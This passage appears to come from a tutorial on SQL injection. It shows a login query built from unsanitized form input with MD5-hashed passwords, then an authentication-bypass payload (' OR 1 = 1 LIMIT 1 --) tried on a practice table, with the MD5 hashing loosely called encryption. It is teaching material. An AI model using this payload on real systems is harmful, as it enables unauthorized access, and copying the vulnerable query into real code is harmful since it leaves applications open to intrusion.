The above form accepts the email address, and password then submits them to a 
PHP file named index.php.
It has an option of storing the login session in a cookie. We have deduced this 
from the remember_me checkbox. It uses the post method to submit data. This means 
the values are not displayed in the URL.

Let’s suppose the statement at the backend for checking user ID is as follows

SELECT * FROM users WHERE email = $_POST['email'] AND password = md5($_POST['password']);

The above statement uses the values of the $_POST[] array directly without sanitizing 
them.
The password is encrypted using MD5 algorithm.

To demonstrate the attack, lets go to www.sqlfiffle.com

Enter the below code in the left panel

CREATE TABLE `users` (
  `id` INT NOT NULL AUTO_INCREMENT,
  `email` VARCHAR(45) NULL,
  `password` VARCHAR(45) NULL,
  PRIMARY KEY (`id`));
  
  
insert into users (email,password) values ('m@m.com',md5('abc'));

When we want to authenticate a user, this might be the SQL query running in the 
background.

SELECT * FROM users WHERE email = 'admin@admin.sys' AND password = md5('1234');

So, lets exploit this weakness and perform an attack!!

SELECT * FROM users 
WHERE 
email = 'xxx@xxx.xxx' OR 1 = 1 LIMIT 1 -- ' ] 
AND 
password = md5('0000');


xxx@xxx.xxx ends with a single quote which completes the string quote
OR 1 = 1 LIMIT 1 is a condition that will always be true and limits the returned 
results to only one record.
-- ' AND … is a SQL comment that eliminates the password part.
